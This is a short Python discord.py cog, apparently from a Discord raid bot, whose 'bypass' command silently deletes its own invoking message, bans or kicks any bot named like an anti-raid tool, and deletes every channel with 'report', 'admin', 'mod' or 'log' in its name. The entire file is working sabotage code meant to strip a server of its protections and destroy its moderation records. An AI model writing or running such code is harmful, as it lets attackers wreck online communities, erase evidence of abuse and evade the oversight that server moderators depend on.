# -*- coding: utf-8 -*-
import discord
from discord.ext import commands

class ByPass(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def bypass(self, ctx):
        try:
            await ctx.message.delete()
        except:
            pass
        guild = ctx.guild
        for member in guild.members:
            if member.bot and "anti" in member.name.lower():
                try:
                    await member.ban(reason="Anti-raid removal")
                except:
                    try:
                        await member.kick(reason="Anti-raid removal")
                    except Exception as e:
                        pass
                        print(f"failed to remove anti-raid bot: {member.name} - {e}")
            else:
                print(f"neexistuje antiraid bot")
        for channel in guild.channels:
            if any(word in channel.name.lower() for word in ["report", "admin", "mod", "log"]):
                try:
                    await channel.delete()
                except:
                    pass
            else:
                print(f"neexistuje antiraid channel")

async def setup(bot):
    await bot.add_cog(ByPass(bot))